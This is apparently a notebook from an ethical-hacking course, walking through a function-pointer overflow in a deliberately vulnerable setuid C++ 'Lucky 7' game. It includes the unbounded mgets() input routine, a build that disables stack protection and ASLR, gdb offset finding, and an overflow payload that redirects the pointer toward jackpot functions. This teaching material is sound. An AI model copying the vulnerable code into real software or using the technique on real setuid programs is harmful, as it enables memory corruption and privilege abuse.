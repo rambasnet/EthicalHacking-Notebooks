{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Global Segment Overflow\n",
    "- recall function pointers are pointers that store addresses of functions/code\n",
    "    - see [Function-Pointers notebook](./Function-Pointers.ipynb) for a review\n",
    "- function pointers can be overwritten using overflow techniques to point to different code/function\n",
    "\n",
    "\n",
    "## Lucky 7 game\n",
    "- various luck-based games that're favored to the house\n",
    "- program uses a function pointer to remember the last game played by the user\n",
    "- the last game function's address is stored in the **User** structure\n",
    "- player object is declared as an uninitialized global variable\n",
    "    - meaning the memory is allocated in the **bss** segment\n",
    "- seteuid multi-user program that stores player's data in /var folder\n",
    "- only root or sudo user can access players' info stored in /var folder\n",
    "- each player is identified by the system's user id\n",
    "- examine and compile and run game programs in demos/other_overflow/ folder\n",
    "- game is divided into one header file and 2 .cpp files\n",
    "- use the provided Makefile found in the same folder; uses C++17 specific features such as system specific file permission\n",
    "- NOTE: program must be setuid, to read/write the database file: `/var/lucky7.txt`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\n",
      "#include <string.h>\n",
      "#include <fcntl.h>\n",
      "#include <sys/stat.h>\n",
      "#include <time.h>\n",
      "#include <stdlib.h>\n",
      "#include <unistd.h> //getuid()\n",
      "#include <sys/types.h> // getuid()\n",
      "#include <iostream>\n",
      "#include \"lucky7.h\"\n",
      "\n",
      "char DATAFILE[] = \"/var/lucky7.txt\"; // File to store players data\n",
      "\n",
      "using namespace std;\n",
      "\n",
      "// Global variables\n",
      "User player;      // Player struct\n",
      "\n",
      "int main(int argc, char* argv[]) {\n",
      "   int choice, last_game = 0;\n",
      "   // gives same addresses as in GDB\n",
      "   //printf(\"player.name @ %p\\n\", &player.name); \n",
      "   //printf(\"player.current_game @ %p\\n\", &player.current_game);\n",
      "   //last_game = 0;\n",
      "   if(not read_player_data(DATAFILE,  player)) // Try to read player data from file.\n",
      "      register_new_player(DATAFILE, player);    // If there is no data, register a new player.\n",
      "\n",
      "   do {\n",
      "      choice = get_choice(player);\n",
      "\n",
      "      if (choice < 4) {\n",
      "         if (choice != last_game) {\n",
      "            switch(choice) {\n",
      "               case 1:\n",
      "                  cout << \"\\n~*~*~ Lucky 7 ~*~*~\\nCosts 10 credits to play this game.\\n\"\n",
      "                  << \"Machine will generate 1 random number between 1 and 9.\\n\"\n",
      "                  << \"If the number is 7, you win a jackpot of 10 THOUSAND.\\n\"\n",
      "                  << \"Otherwise, you lose.\\n\" << flush << endl;\n",
      "                  player.current_game = lucky7;\n",
      "                  break;\n",
      "               case 2:\n",
      "                  cout << \"\\n~*~*~ Lucky 777 ~*~*~\\nCosts 50 credits to play this game.\\n\"\n",
      "                  << \"Machine will generate 3 random numbers each between 1 and 9.\\n\"\n",
      "                  << \"If all 3 numbers are 7, you win a jackpot of 100 THOUSAND.\\n\"\n",
      "                  << \"If all 3 numbers match, you win 10 THOUSAND.\\n\"\n",
      "                  << \"Otherwise, you lose.\\n Enter to continue...\" << flush << endl;               \n",
      "                  player.current_game = lucky777;\n",
      "                  break;\n",
      "               case 3:\n",
      "                  cout << \"\\n~*~*~ Lucky 77777 ~*~*~\\nCosts 100 credits to play this game.\\n\"\n",
      "                  << \"Machine will generate 5 random numbers each between 1 and 9.\\n\"\n",
      "                  << \"If all 5 numbers are 7, you win a jackpot of 1 MILLION.\\n\"\n",
      "                  << \"If all 5 numbers match, you win 100 THOUSAND.\\n\"\n",
      "                  << \"Otherwise, you lose.\\n Enter to continue...\" << flush << endl;\n",
      "                  player.current_game = lucky77777;\n",
      "                  break;\n",
      "            }\n",
      "            last_game = choice;\n",
      "         }  \n",
      "         play_the_game();\n",
      "      }\n",
      "      else if (choice == 4)\n",
      "         show_credits(player);\n",
      "      else if (choice == 5) {\n",
      "         change_username();\n",
      "         update_player_data(DATAFILE, player);\n",
      "         printf(\"Your name has been changed.\\n\\n\");\n",
      "      }\n",
      "      else if (choice == 6)\n",
      "         reset_credit(DATAFILE, player);\n",
      "   \n",
      "      //cin.get();\n",
      "   } while(choice !=7 );\n",
      "   printf(\"\\nThanks for playing! Good Bye.\\n\");\n",
      "}\n",
      "\n",
      "\n",
      "// This function simply awards the jackpot for the Pick a Number game\n",
      "void jackpot10K() {\n",
      "   printf(\"*+*+*+*+*+* JACKPOT 10 THOUSAND *+*+*+*+*+*\\n\");\n",
      "   printf(\"Congratulations!\\n You have won the jackpot of 10,000 (10K) credits!\\n\");\n",
      "   player.credits += 10000;\n",
      "}\n",
      "\n",
      "// This function simply awards the jackpot for the lucky 777 game\n",
      "void jackpot100K() {\n",
      "   printf(\"*+*+*+*+*+* JACKPOT 100 THOUSAND *+*+*+*+*+*\\n\");\n",
      "   printf(\"Congratulations!!!!\\n You have won the jackpot of 100,000 (100K) credits!\\n\");\n",
      "   player.credits += 100000;\n",
      "}\n",
      "\n",
      "// This function simply awards the jackpot for the lucky 77777 game\n",
      "void jackpot1M() {\n",
      "   printf(\"*+*+*+*+*+* JACKPOT 1 MILLION *+*+*+*+*+*\\n\");\n",
      "   printf(\"!!!!Congratulations!!!!You have won the jackpot of 1,000,000 (1M) credits!\\n\");\n",
      "   player.credits += 1000000;\n",
      "}\n",
      "\n",
      "void deduct_credits() {\n",
      "   printf(\"\\n[DEBUG] current_game pointer 0x%08x\\n\", (unsigned int)player.current_game);\n",
      "   if (player.current_game == lucky7 and player.credits >= 10) {\n",
      "      player.credits -= 10;\n",
      "   }\n",
      "\n",
      "   if (player.current_game == lucky777 and player.credits >= 50) {\n",
      "      player.credits -= 50;\n",
      "   }\n",
      "\n",
      "   if (player.current_game == lucky77777 and player.credits >= 100) {\n",
      "      player.credits -= 100;\n",
      "   }\n",
      "}\n",
      "\n",
      "// This function contains a loop to allow the current game to be\n",
      "// played again. It also writes the new credit totals to file\n",
      "// after each game is played.\n",
      "void play_the_game() { \n",
      "   char again;\n",
      "   int result;\n",
      "   do {\n",
      "      if (player.credits < 10) {\n",
      "         cout << \"Sorry, you're out of credit.\\nReset your credit to 500 to play again\\n\";\n",
      "         break;\n",
      "      }\n",
      "      deduct_credits();\n",
      "\n",
      "      result = player.current_game(); // call current_game function ptr\n",
      "      if( result == 1) // if won, give jackpot\n",
      "         jackpot10K();\n",
      "      else if (result == 2)\n",
      "         jackpot100K();\n",
      "      else if (result == 3)\n",
      "         jackpot1M();\n",
      "      else\n",
      "         cout << \"Sorry! Better luck next time...\\n\";\n",
      "\n",
      "      printf(\"\\nYou have %u credits\\n\", player.credits);\n",
      "      update_player_data(DATAFILE, player); // Write the new credit total to file.\n",
      "      printf(\"Would you like to play again? [y/n]: \");\n",
      "      //selection = '\\n';\n",
      "      cin >> ws; // read and ignore all the whitespaces\n",
      "      cin >> again;\n",
      "      \n",
      "   } while(again == 'y' or again == 'Y');\n",
      "}\n",
      "\n",
      "void change_username() {\n",
      "   printf(\"\\nChange user name\\n\");\n",
      "   cout << \"Enter your new name:\\n\";\n",
      "   mgets(player.name);\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "! cat demos/other_overflow/main.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\n",
      "#include <string.h>\n",
      "#include <fcntl.h>\n",
      "#include <sys/stat.h>\n",
      "#include <time.h>\n",
      "#include <stdlib.h>\n",
      "#include <unistd.h> //getuid()\n",
      "#include <sys/types.h> // getuid()\n",
      "#include <iostream>\n",
      "#include <fstream>\n",
      "#include <iomanip>\n",
      "#include <filesystem> // file system specific permission\n",
      "\n",
      "#include \"lucky7.h\"\n",
      "\n",
      "using namespace std;\n",
      "namespace fs = std::filesystem;\n",
      "\n",
      "int get_choice(User &player) {\n",
      "   int choice = 0;\n",
      "   //do{\n",
      "      //system(\"clear\");\n",
      "      cout << \"-=[ Lucky 7 Game Menu ]=-\\n\";\n",
      "      cout << \"1 - Play Lucky 7 game\\n\";\n",
      "      cout << \"2 - Play Lucky 777 game\\n\";\n",
      "      cout << \"3 - Play Lucky 77777 game\\n\";\n",
      "      cout << \"4 - View your total credits\\n\";\n",
      "      cout << \"5 - Change your user name\\n\";\n",
      "      cout << \"6 - Reset your account at 500 credits\\n\";\n",
      "      cout << \"7 - Quit\\n\";\n",
      "      printf(\"[Name: %s]\\n\", player.name);\n",
      "      printf(\"[You have %u credits] ->  \", player.credits);\n",
      "      cout << \"Enter your choice [1-7]: \";\n",
      "      cin >> choice;\n",
      "    \n",
      "      if ((choice < 1) || (choice > 7)) {\n",
      "         cerr << \"The number \" << choice << \" is an invalid selection.\\n\\n\";\n",
      "         return 1;\n",
      "      }\n",
      "\n",
      "      else \n",
      "         return choice;\n",
      "\n",
      "   //} while(true);\n",
      "   \n",
      "}\n",
      "\n",
      "// This is the new user registration function.\n",
      "// It will create a new player account and append it to the file\n",
      "void register_new_player(char * data_file, User &player)  { \n",
      "    cout << \"-=-={ New Player Registration }=-=-\\n\";\n",
      "    cout << \"Enter your name: \";\n",
      "    mgets(player.name); // get player's name\n",
      "    player.uid = getuid();\n",
      "    player.credits = 500;\n",
      "\n",
      "    ofstream fout(data_file, ios::app);\n",
      "    if(not fout) {\n",
      "        cerr << \"Fatal error in register_new_player() while opening \" << data_file << \" file\\n\";\n",
      "        exit(-1);\n",
      "    }\n",
      "    \n",
      "    //fout << player.uid << \" \" << player.credits << \" \" << player.name << endl;\n",
      "    fout << left << setw(10) << player.uid << setw(15) << player.credits << setw(100) << player.name << endl;\n",
      "    fs::permissions(data_file, fs::perms::group_read|fs::perms::others_read, fs::perm_options::remove);\n",
      "    fout.close();\n",
      "    printf(\"\\nWelcome to the Lucky 7 Game %s.\\n\", player.name);\n",
      "    printf(\"You have been given %u credits.\\n\", player.credits);\n",
      "}\n",
      "\n",
      "// This function writes the current player data to the file.\n",
      "// It is used primarily for updating the credits after games.\n",
      "void update_player_data(char * data_file, User &player) {\n",
      "    int read_uid, credits;\n",
      "    string name;\n",
      "    fstream file(data_file, ios::out|ios::in);\n",
      "    streampos position;\n",
      "    if (!file) {\n",
      "        cerr << \"Fatal error opening file \" << data_file << endl;\n",
      "        exit(-1);\n",
      "    }\n",
      "\n",
      "    while(file >> read_uid) {  // Loop until correct uid is found\n",
      "        if (read_uid == player.uid) // found our line\n",
      "        {\n",
      "            file.seekg(-4, ios::cur);\n",
      "            file << left << setw(10) << player.uid << setw(15) << player.credits << setw(100) << player.name << endl;\n",
      "            break;\n",
      "        }\n",
      "        else {\n",
      "            file >> credits;\n",
      "            getline(file, name);\n",
      "        }\n",
      "    }\n",
      "    file.close();\n",
      "}\n",
      "\n",
      "// This function reads the current player data from db file.\n",
      "bool read_player_data(char * data_file, User &player) {\n",
      "    int uid, read_uid, credits;\n",
      "    string name;\n",
      "    ifstream fin(data_file);\n",
      "\n",
      "    uid = getuid(); // get loggedin user's id\n",
      "    bool found = false;\n",
      "    if (not fin) {\n",
      "        cerr << \"Database file doesn't exist: \" << data_file << endl;\n",
      "        return false;\n",
      "    }\n",
      "\n",
      "    while(fin >> read_uid >> credits and not found) {  // Loop until correct uid is found\n",
      "        //cout << read_uid << \" \" << credits << endl;\n",
      "        if (read_uid == uid) { // found our player's data\n",
      "            player.uid = uid;\n",
      "            player.credits = credits;\n",
      "            fin >> ws; // read and discard trailing whitespaces\n",
      "            getline(fin, name);\n",
      "            strcpy(player.name, name.c_str());\n",
      "            player.current_game = nullptr;\n",
      "            found = true;\n",
      "        }\n",
      "        else {\n",
      "            // read and discard player's full name\n",
      "            //fin >> credits;\n",
      "            getline(fin, name);\n",
      "        }\n",
      "    }\n",
      "    fin.close();\n",
      "    return found;\n",
      "}\n",
      "\n",
      "char * mgets(char *dst) {\n",
      "    char *ptr = dst;\n",
      "    int ch; \n",
      "\t/* skip leading white spaces */ \n",
      "    while (true) {\n",
      "        ch = getchar();\n",
      "        if (ch == ' ' or ch == '\\t' or ch == '\\n') continue;\n",
      "        else break;\n",
      "    }\n",
      "\n",
      "    /* now read the rest until \\n or EOF */ \n",
      "    while (true) {\n",
      "        *(ptr++) = ch; \n",
      "        ch = getchar();\n",
      "        if (ch == '\\n' or ch == EOF) break;\n",
      "    }\n",
      "    *(ptr) = 0;\n",
      "    return dst;\n",
      "}\n",
      "\n",
      "void show_credits(const User & player) {\n",
      "    cout << setw(30) << setfill('=') << \"\\n\";\n",
      "    cout << \"Name: \" << player.name << endl;\n",
      "    cout << \"Credits: \" << player.credits << endl;\n",
      "    cout << setw(20) << \"\\n\";\n",
      "    cout << setfill(' ');\n",
      "}\n",
      "\n",
      "void printNumber(int randNumber) {\n",
      "    int maxRoll = 10000;\n",
      "    int num;\n",
      "    for(int i=0; i<maxRoll; i++) {\n",
      "        num = i%9+1;\n",
      "        cout << num << flush;\n",
      "        sleep(0.25);\n",
      "        cout << \"\\b\" << flush;\n",
      "    }\n",
      "    cout << randNumber << \" \" << flush;\n",
      "        \n",
      "}\n",
      "\n",
      "// win jackpot of 10K if random number 7 is generated\n",
      "unsigned int lucky7() {\n",
      "    cout << \"the random number is: \" << flush;\n",
      "    int num = get_random_number(9);\n",
      "    printNumber(num);\n",
      "    cout << endl;\n",
      "    if (num == 7) return 1; //win jackpot\n",
      "    else return 0; // loss\n",
      "}\n",
      "\n",
      "// win jackpot of 100K for 3 777 numbers\n",
      "unsigned int lucky777() {\n",
      "    cout << \"3 random numers are: \" << flush;\n",
      "    int num1 = get_random_number(9);\n",
      "    printNumber(num1);\n",
      "\n",
      "    int num2 = get_random_number(9);\n",
      "    printNumber(num2);\n",
      "\n",
      "    int num3 = get_random_number(9);\n",
      "    printNumber(num3);\n",
      "\n",
      "    cout << endl;\n",
      "    if (num1 == 7 and num2 == 7 and num3 == 7) return 2; // jackpot\n",
      "    else if (num1 == num2 and num2 == num3) return 1; // normal win\n",
      "    else return 0;\n",
      "}\n",
      "\n",
      "// win Jackpot of 1M if all 5 random numbers are 77777\n",
      "unsigned int lucky77777() {\n",
      "    cout << \"5 random numers are: \" << flush;\n",
      "    int num1 = get_random_number(9);\n",
      "    printNumber(num1);\n",
      "\n",
      "    int num2 = get_random_number(9);\n",
      "    printNumber(num2);\n",
      "\n",
      "    int num3 = get_random_number(9);\n",
      "    printNumber(num3);\n",
      "\n",
      "    int num4 = get_random_number(9);\n",
      "    printNumber(num4);\n",
      "\n",
      "    int num5 = get_random_number(9);\n",
      "    printNumber(num5);\n",
      "    cout << endl;\n",
      "    if (num1 == 7 and num2 == 7 and num3 == 7 and num4 == 7 and num5 ==7) return 3;\n",
      "    else if (num1 == num2 and num2 ==  num3 and num3 == num4 and num4 == num5) return 2;\n",
      "    else return 0;\n",
      "}\n",
      "\n",
      "void reset_credit(char * datafile, User & player) {\n",
      "   player.credits = 500;\n",
      "   update_player_data(datafile, player);\n",
      "}\n",
      "\n",
      "unsigned int get_random_number(int max) {\n",
      "    srand(time(0)); // Seed the randomizer with the current time.\n",
      "    int num = rand()%max+1;\n",
      "    return num;\n",
      "}\n",
      "\n",
      "void rstrip(string &line) {\n",
      "    int last_space = line.length()-1;\n",
      "    while(line[last_space] == ' ') --last_space;\n",
      "    line.erase(line.begin()+last_space+1, line.end());\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat demos/other_overflow/lucky7.cpp"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- change current working directory to other_overflow folder where the program and Makefile are\n",
    "- compile using the Makefile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/other_overflow\n"
     ]
    }
   ],
   "source": [
    "%cd ./demos/other_overflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: g++ -g -Wall -m32 -std=c++17 -fno-stack-protector -z execstack -no-pie lucky7.cpp main.cpp  -o lucky7.exe \n",
      "# must run make with sudo to disable randomaize_va_space\n",
      "echo 0 | tee /proc/sys/kernel/randomize_va_space\n",
      "0\n",
      "sudo chown root:root lucky7.exe \n",
      "sudo chmod +s lucky7.exe  \n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: cat: /var/lucky7.txt: No such file or directory\n"
     ]
    }
   ],
   "source": [
    "# program uses /var/lucky7.txt to store player's information\n",
    "# let's take a look into it if it exists.\n",
    "# if the file doesn't exists, run the program to create one\n",
    "! echo kali | sudo -S cat /var/lucky7.txt\n",
    "# userid     credits    palaer's_full_name"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# if file exists, delete it to start fresh\n",
    "! echo kali | sudo -S rm /var/lucky7.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ls: cannot access '/var/lucky7.txt': No such file or directory\n"
     ]
    }
   ],
   "source": [
    "! ls -al /var/lucky7.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-rwsr-sr-x 1 root root 261468 May  3 16:37 lucky7.exe\n"
     ]
    }
   ],
   "source": [
    "! ls -l lucky7.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### play the interactive game\n",
    "- lucky is an interactive program that doesn't work with Jupyter Notebook as of Aug. 2021\n",
    "- Use Terminal to play the program; follow the menu provided by the program to play the game\n",
    "- press `CTRL-Z` to temporarily suspend (put it in background) the current process\n",
    "- enter `fg` command to bring the suspended program to fore ground\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ ./lucky7.exe                                                                                                                                                                      \n",
    "Database file doesn't exist: /var/lucky7.txt\n",
    "-=-={ New Player Registration }=-=-\n",
    "Enter your name: John Smith\n",
    "                                                                                                                             \n",
    "Welcome to the Lucky 7 Game John Smith.                                                                                      \n",
    "You have been given 500 credits.\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: John Smith]\n",
    "[You have 500 credits] ->  Enter your choice [1-7]: 2\n",
    "\n",
    "~*~*~ Lucky 777 ~*~*~\n",
    "Costs 50 credits to play this game.\n",
    "Machine will generate 3 random numbers each between 1 and 9.\n",
    "If all 3 numbers are 7, you win a jackpot of 100 THOUSAND\n",
    "If all 3 numbers match, you win 10 THOUSAND\n",
    "Otherwise, you lose.\n",
    " Enter to continue...\n",
    "\n",
    "[DEBUG] current_game pointer 0x0804b1cd\n",
    "3 random numers are: 4 3 4 \n",
    "Sorry! Better luck next time...\n",
    "\n",
    "You have 450 credits\n",
    "Would you like to play again? [y/n]:\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Find the vulnerability in the game\n",
    "- do code review to find global **player** object and `change_username()`\n",
    "- note **user** struct has declared name buffer of 100 bytes\n",
    "- change_username() function uses `mgest()` function to read and store data into name field one character at a time until '\\n'\n",
    "- there's nothing to limit it to the length of the destination buffer!\n",
    "- so, the game has buffer overrun/overflow vulnerability!\n",
    "\n",
    "### Exploit the overflow vulnerability\n",
    "- run the program\n",
    "- explore the memory addresses of **name** and **current_game** using peda/gdb\n",
    "- use gdb to debug the live process\n",
    "- find the process id of lucky7.exe process\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ ps aux | grep lucky7.exe                          \n",
    "root       30439  0.1  0.0   5476  1344 pts/2    S+   10:54   0:00 ./lucky7.exe\n",
    "kali       30801  0.0  0.0   6320   724 pts/3    S+   10:59   0:00 grep --color=auto lucky7.exe\n",
    "\n",
    "\n",
    "- use the process_id to debug in gdb\n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking/demos/other_overflow]\n",
    "└─$ sudo gdb -q --pid=59004 --symbols=./lucky7.exe\n",
    "\n",
    "(gdb) p/x &player.name\n",
    "$1 = 0x8050148\n",
    "\n",
    "(gdb) p/x &player.current_game\n",
    "$2 = 0x80501ac\n",
    "\n",
    "(gdb) p/u 0x80501ac - 0x8050148 # (address of player.current_game) - (address of player.name)\n",
    "$3 = 100\n",
    "```\n",
    "\n",
    "- notice, **name[100]** is at a lower address\n",
    "- **(\\*current_game)()** is at a higher address find the exact size that would overlfow the current_game\n",
    "- the offset should be at least 100 bytes\n",
    "\n",
    "### Let's overwrite the current_game's value with our controlled address\n",
    "\n",
    "- create a string with 100As + BBBB\n",
    "- detach the process from gdb and change the name with menu option 5 pasting the following buffer\n",
    "- Enter 1 to play the game and the buffer should overwrite the [DEBUG] current_game pointer with 0x42424242"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n"
     ]
    }
   ],
   "source": [
    "# change the name to the following string\n",
    "! python -c 'print(\"A\"*100 + \"B\"*4)'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run the program and play the last game after changing name\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ ./lucky7.exe           \n",
    "Database file doesn't exist: /var/lucky7.txt\n",
    "-=-={ New Player Registration }=-=-\n",
    "Enter your name: John Smith\n",
    "\n",
    "Welcome to the Lucky 7 Game John Smith.\n",
    "You have been given 500 credits.\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: John Smith]\n",
    "[You have 500 credits] ->  Enter your choice [1-7]: 1\n",
    "\n",
    "~*~*~ Lucky 7 ~*~*~\n",
    "Costs 10 credits to play this game.\n",
    "Machine will generate 1 random numbers each between 1 and 9.\n",
    "If the number is 7, you win a jackpot of 10 THOUSAND\n",
    "Otherwise, you lose.\n",
    "\n",
    "\n",
    "[DEBUG] current_game pointer 0x0804b141\n",
    "the random number is: 8 \n",
    "Sorry! Better luck next time...\n",
    "\n",
    "You have 490 credits\n",
    "Would you like to play again? [y/n]: n\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: John Smith]\n",
    "[You have 490 credits] ->  Enter your choice [1-7]: 5\n",
    "\n",
    "Change user name\n",
    "Enter your new name:\n",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n",
    "Your name has been changed.\n",
    "\n",
    "-=[ Lucky 7 Game Menu ]=-\n",
    "1 - Play Lucky 7 game\n",
    "2 - Play Lucky 777 game\n",
    "3 - Play Lucky 77777 game\n",
    "4 - View your total credits\n",
    "5 - Change your user name\n",
    "6 - Reset your account at 500 credits\n",
    "7 - Quit\n",
    "[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB]\n",
    "[You have 490 credits] ->  Enter your choice [1-7]: 1\n",
    "\n",
    "[DEBUG] current_game pointer 0x42424242\n",
    "zsh: segmentation fault  ./lucky7.exe\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Find useful functions/code in the program to execute\n",
    "- **nm** command lists symbols in object files with corresponding addresses\n",
    "    - can be used to find addresses of various functions in a program\n",
    "- `jackpot()` functions are intruiging!\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking/demos/other_overflow]\n",
    "└─$ nm ./lucky7.exe                                                                                              \n",
    "┌──(kali㉿K)-[~/projects/EthicalHacking/demos/other_overflow]\n",
    "└─$ nm ./lucky7.exe                                                                                                     139 ⨯\n",
    "08050114 B __bss_start\n",
    "08050120 b completed.0\n",
    "         U __cxa_atexit@GLIBC_2.1.3\n",
    "08050104 D DATAFILE\n",
    "080500f8 D __data_start\n",
    "080500f8 W data_start\n",
    "0804a440 t deregister_tm_clones\n",
    "0804a420 T _dl_relocate_static_pie\n",
    "0804a4c0 t __do_global_dtors_aux\n",
    "0804fee4 d __do_global_dtors_aux_fini_array_entry\n",
    "080500fc D __dso_handle\n",
    "08050100 V DW.ref.__gxx_personality_v0\n",
    "0804fee8 d _DYNAMIC\n",
    "08050114 D _edata\n",
    "080501b4 B _end\n",
    "         U exit@GLIBC_2.0\n",
    "0804c3d8 T _fini\n",
    "0804d000 R _fp_hw\n",
    "0804a4f0 t frame_dummy\n",
    "0804fed8 d __frame_dummy_init_array_entry\n",
    "0804e438 r __FRAME_END__\n",
    "         U getchar@GLIBC_2.0\n",
    "         U getuid@GLIBC_2.0\n",
    "08050000 d _GLOBAL_OFFSET_TABLE_\n",
    "0804c34a t _GLOBAL__sub_I_DATAFILE\n",
    "0804b5a0 t _GLOBAL__sub_I__Z10get_choiceR4User\n",
    "         w __gmon_start__\n",
    "0804d7e4 r __GNU_EH_FRAME_HDR\n",
    "         U __gxx_personality_v0@CXXABI_1.3\n",
    "0804a000 T _init\n",
    "0804fee4 d __init_array_end\n",
    "0804fed8 d __init_array_start\n",
    "0804d004 R _IO_stdin_used\n",
    "0804c3d0 T __libc_csu_fini\n",
    "0804c370 T __libc_csu_init\n",
    "         U __libc_start_main@GLIBC_2.0\n",
    "0804bcda T main\n",
    "08050140 B player\n",
    "         U printf@GLIBC_2.0\n",
    "         U puts@GLIBC_2.0\n",
    "         U rand@GLIBC_2.0\n",
    "0804a480 t register_tm_clones\n",
    "         U sleep@GLIBC_2.0\n",
    "         U srand@GLIBC_2.0\n",
    "0804a3e0 T _start\n",
    "         U strcpy@GLIBC_2.0\n",
    "         U strlen@GLIBC_2.0\n",
    "         U time@GLIBC_2.0\n",
    "08050114 D __TMC_END__\n",
    "         U _Unwind_Resume@GCC_3.0\n",
    "0804bcd2 T __x86.get_pc_thunk.ax\n",
    "0804c3d1 T __x86.get_pc_thunk.bp\n",
    "0804a430 T __x86.get_pc_thunk.bx\n",
    "0804bcd6 T __x86.get_pc_thunk.si\n",
    "0804a4f2 T _Z10get_choiceR4User\n",
    "0804bfeb T _Z10jackpot10Kv !!!!!!!!!<- JACKPOT ---> !!!!!!!!!!\n",
    "0804b2b8 T _Z10lucky77777v\n",
    "0804c038 T _Z11jackpot100Kv\n",
    "0804b042 T _Z11printNumberi\n",
    "0804b3fb T _Z12reset_creditPcR4User\n",
    "0804aeeb T _Z12show_creditsRK4User\n",
    "0804c181 T _Z13play_the_gamev\n",
    "0804c0d2 T _Z14deduct_creditsv\n",
    "0804c29c T _Z15change_usernamev\n",
    "0804ac37 T _Z16read_player_dataPcR4User\n",
    "0804b429 T _Z17get_random_numberi\n",
    "0804a97f T _Z18update_player_dataPcR4User\n",
    "0804a6c0 T _Z19register_new_playerPcR4User\n",
    "0804b547 t _Z41__static_initialization_and_destruction_0ii\n",
    "0804c2f1 t _Z41__static_initialization_and_destruction_0ii\n",
    "0804ae82 T _Z5mgetsPc\n",
    "0804b141 T _Z6lucky7v\n",
    "0804b46d T _Z6rstripRNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE\n",
    "0804b1cd T _Z8lucky777v\n",
    "0804c085 T _Z9jackpot1Mv\n",
    "0804b7fc W _ZN9__gnu_cxx11char_traitsIcE2eqERKcS3_\n",
    "0804b81c W _ZN9__gnu_cxx11char_traitsIcE6lengthEPKc\n",
    "...\n",
    "\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Script the interactive user input\n",
    "- instead of typing options and commands interactively, they can be scripted and piped into the program\n",
    "- program can then parse and use the input as if someone is interactively typing it from the std input stream\n",
    "- make sure the game has been played atleast once by the current user\n",
    "    - the following script needs to start with full name otherwise!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1\n",
      "y\n",
      "n\n",
      "7\n"
     ]
    }
   ],
   "source": [
    "# play game #1, y, n; \n",
    "# Enter 7 to quit\n",
    "! python -c 'print(\"1\\ny\\nn\\n7\")'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
